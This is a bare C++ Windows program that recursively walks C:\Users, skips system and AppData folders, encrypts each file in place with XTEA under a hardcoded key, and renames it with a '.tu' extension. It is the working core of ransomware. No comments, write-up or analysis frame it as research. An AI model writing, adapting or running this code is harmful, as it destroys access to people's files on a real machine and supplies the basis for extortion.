#include <string>
#include <iostream>
#include <filesystem>
#include <fstream>
#include<string>
#include <iterator>
#include <Windows.h>
#include <algorithm>
#include <set>
#include <Shlwapi.h>
#include <stdio.h>


#define BLOCK_SIZE 8



unsigned int key[4] = { 0xFACE, 0xDEAD, 0xBABE, 0xD00D };


void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])
{
	unsigned int i;
	uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x9E3779B9;
	for (i = 0; i < num_rounds; i++)
	{
		v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
		sum += delta;
		v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
	}
	v[0] = v0; v[1] = v1;
}


int main()
{

	std::set<std::string> ignoredirs = { "system32","Program Files","Program Files (x86)","$Recycle.Bin","Windows","AppData","ProgramData"};
	std::string path = "C:\\Users";
	for (std::filesystem::recursive_directory_iterator entry(path),end; entry != end; ++entry)
	{
		std::fstream file(entry->path(), std::ios::in | std::ios::out | std::ios::binary);
		if (ignoredirs.find(entry->path().filename().string()) != ignoredirs.end())
		{
			entry.disable_recursion_pending();
		}
		else if (!std::filesystem::is_directory(entry->path()) && entry->path().has_extension())
		{
			try
			{
				std::cout << "Open File " << entry->path().string() << std::endl;
				file.seekg(0, std::ios::end);
				unsigned fileSize = file.tellg(); //Get file size
				std::cout << "File size: " << fileSize << " bytes" << std::endl;
				file.seekg(std::ios::beg);
				file.clear();

				//Calculate number of blocks to be encrypted/decrypted
				int blockNumber = fileSize / BLOCK_SIZE;
				if (fileSize % BLOCK_SIZE != 0) { ++blockNumber; }
				std::cout << "Number of blocks: " << blockNumber << std::endl;

				//Decalre data array for file operations
				unsigned char dataArray[BLOCK_SIZE];
				unsigned filePosition = file.tellg();
				if (blockNumber < 2000000)
				{
					std::cout << "Starting encryption" << std::endl;
					for (int i = 0; i < blockNumber; i++)
					{
						//Get data from file
						file.seekg(filePosition);
						file.read((char*)dataArray, BLOCK_SIZE);

						//Encrypt
						encipher(32, (uint32_t*)dataArray, key);

						//Write to file
						file.seekp(filePosition);
						file.write((char*)dataArray, BLOCK_SIZE);

						//Zero out the data array and increase the pos counter
						memset(dataArray, 0, BLOCK_SIZE);
						filePosition += BLOCK_SIZE;
					}
				}
				
				//Close file
				file.close();
				entry->path().string();
				rename(entry->path(), entry->path().string() + ".tu");
				
			}
			catch(...)
			{

			}
			
		}

	}

	
}
